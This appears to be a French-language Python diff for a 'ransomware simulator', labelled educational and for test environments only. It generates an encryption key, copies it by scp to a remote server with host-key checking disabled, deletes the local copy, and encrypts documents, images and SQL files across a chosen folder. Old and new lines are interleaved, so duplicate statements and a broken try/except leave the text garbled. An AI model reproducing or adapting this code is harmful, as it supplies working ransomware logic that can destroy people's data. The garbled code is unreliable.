#!/usr/bin/env python3
# RANSOMWARE SIMULATEUR - VERSION SSH PUR (SANS SSHPASS)
# RANSOMWARE SIMULATEUR - VERSION AVEC MENU INTERACTIF
import os
import sys
import subprocess
from pathlib import Path
from cryptography.fernet import Fernet
from pathlib import Path

# Configuration
SSH_SERVER = "192.168.45.90"
SSH_USER = "doranco"
REMOTE_DIR = "/home/doranco/cle_dechiffrement"
SSH_KEY = "/home/doranco/.ssh/id_ed25519"  # Chemin vers votre clÃ© SSH privÃ©e
KEY_FILE = "decryption_key.key"

class RansomwareSimulator:
    def __init__(self):

@@ -18,50 +18,70 @@ class RansomwareSimulator:
        self.cipher = None
        self.target_exts = {'.txt', '.doc', '.docx', '.pdf', '.jpg', '.sql'}
        
    def clear_screen(self):
        """Efface l'Ã©cran du terminal"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        """Affiche une banniÃ¨re stylisÃ©e"""
        self.clear_screen()
        print("""
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘
â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•     â•šâ•â•
        """)
        print("=== SIMULATEUR Ã‰DUCATIF - MENU PRINCIPAL ===")
        print("âš ï¸ Ã€ utiliser uniquement en environnement de test âš ï¸\n")

    def generate_key(self):
        """GÃ©nÃ¨re une clÃ© de chiffrement"""
        print("ğŸ”‘ GÃ©nÃ©ration de la clÃ©...")
        print("\nğŸ”‘ GÃ©nÃ©ration de la clÃ©...")
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        print(f"âœ… ClÃ© gÃ©nÃ©rÃ©e: {self.key.decode()[:12]}...")
        return True

    def transfer_key(self):
        """TransfÃ¨re la clÃ© via SCP avec authentification par clÃ©"""
    def transfer_key_ssh(self):
        """TransfÃ¨re la clÃ© via SSH natif"""
        if not self.key:
            print("âŒ Aucune clÃ© gÃ©nÃ©rÃ©e!")
            print("\nâŒ Aucune clÃ© gÃ©nÃ©rÃ©e!")
            return False

        try:
            print("\nğŸ”„ Transfert de la clÃ©...")
            
            # CrÃ©e un fichier temporaire
            key_file = "decryption_key.key"
            with open(key_file, 'wb') as f:
            with open(KEY_FILE, 'wb') as f:
                f.write(self.key)
            
            # 1. CrÃ©e le rÃ©pertoire distant
            # CrÃ©e le rÃ©pertoire distant
            subprocess.run([
                'ssh',
                '-i', SSH_KEY,
                f'{SSH_USER}@{SSH_SERVER}',
                f'mkdir -p {REMOTE_DIR}'
            ], check=True)
            
            # 2. TransfÃ¨re la clÃ©
            # Copie la clÃ© via SCP
            subprocess.run([
                'scp',
                '-i', SSH_KEY,
                '-o', 'StrictHostKeyChecking=no',
                key_file,
                f'{SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/'
                KEY_FILE,
                f'{SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/{KEY_FILE}'
            ], check=True)
            
            # Nettoyage
            os.remove(key_file)
            print(f"ğŸ“¤ ClÃ© transfÃ©rÃ©e vers {SSH_SERVER}:{REMOTE_DIR}")
            os.remove(KEY_FILE)
            
            print(f"\nğŸ“¤ ClÃ© transfÃ©rÃ©e avec succÃ¨s vers :")
            print(f"   Serveur: {SSH_SERVER}")
            print(f"   Chemin: {REMOTE_DIR}/{KEY_FILE}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"âŒ Ã‰chec du transfert SSH: {e}")
            print(f"\nâŒ Ã‰chec du transfert SSH: {e}")
            return False

    def encrypt_file(self, filepath):

@@ -83,21 +103,82 @@ class RansomwareSimulator:
            print(f"âš ï¸ Erreur sur {filepath}: {e}")
            return False

    def encrypt_directory(self, path='.'):
        """Chiffre un dossier"""
        if not os.path.exists(path):
            print("\nâŒ Le dossier spÃ©cifiÃ© n'existe pas!")
            return

        encrypted = errors = 0
        print(f"\nğŸ”’ DÃ©but du chiffrement de: {path}")
        
        for root, _, files in os.walk(path):
            for file in files:
                if Path(file).suffix.lower() in self.target_exts:
                    if self.encrypt_file(os.path.join(root, file)):
                        encrypted += 1
                    else:
                        errors += 1
        
        print(f"\nâœ… Chiffrement terminÃ©!")
        print(f"   Fichiers chiffrÃ©s: {encrypted}")
        print(f"   Erreurs: {errors}")

    def show_menu(self):
        """Affiche le menu interactif"""
        while True:
            self.show_banner()
            print("Options disponibles:")
            print("1. GÃ©nÃ©rer une nouvelle clÃ©")
            print("2. TransfÃ©rer la clÃ© actuelle")
            print("3. Chiffrer un dossier")
            print("4. Tout faire (mode automatique)")
            print("0. Quitter\n")
            
            choice = input("Votre choix (0-4): ")
            
            if choice == "1":
                self.generate_key()
            elif choice == "2":
                if self.key:
                    self.transfer_key_ssh()
                else:
                    print("\nâŒ Vous devez d'abord gÃ©nÃ©rer une clÃ©!")
            elif choice == "3":
                if self.key:
                    path = input("\nEntrez le chemin du dossier Ã  chiffrer: ")
                    self.encrypt_directory(path)
                else:
                    print("\nâŒ Vous devez d'abord gÃ©nÃ©rer une clÃ©!")
            elif choice == "4":
                print("\nğŸš€ Mode automatique activÃ©...")
                if self.generate_key():
                    if self.transfer_key_ssh():
                        path = input("\nEntrez le chemin du dossier Ã  chiffrer: ")
                        self.encrypt_directory(path)
            elif choice == "0":
                print("\nğŸ‘‹ Au revoir!")
                sys.exit(0)
            else:
                print("\nâŒ Option invalide!")
            
            input("\nAppuyez sur EntrÃ©e pour continuer...")

if __name__ == '__main__':
    # VÃ©rification des prÃ©requis
    try:
        # VÃ©rifie que SSH est installÃ©
        subprocess.run(['ssh', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(['scp', '-V'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except:
        print("""âŒ Erreur: OpenSSH doit Ãªtre installÃ©
        sudo apt update && sudo apt install -y openssh-client
        """)
        
        sim = RansomwareSimulator()
        sim.show_menu()
        
    except subprocess.CalledProcessError:
        print("\nâŒ Erreur: OpenSSH doit Ãªtre installÃ©")
        print("Installez-le avec: sudo apt install openssh-client")
        sys.exit(1)

    # ExÃ©cution
    sim = RansomwareSimulator()
    if sim.generate_key() and sim.transfer_key():
        print("âœ… OpÃ©ration rÃ©ussie!")
    else:
        print("âŒ Ã‰chec de l'opÃ©ration")
    except KeyboardInterrupt:
        print("\n\nâ¹ï¸ OpÃ©ration annulÃ©e par l'utilisateur")
        sys.exit(0)
    except Exception as e:
        print(f"\nâŒ Erreur inattendue: {e}")
        sys.exit(1)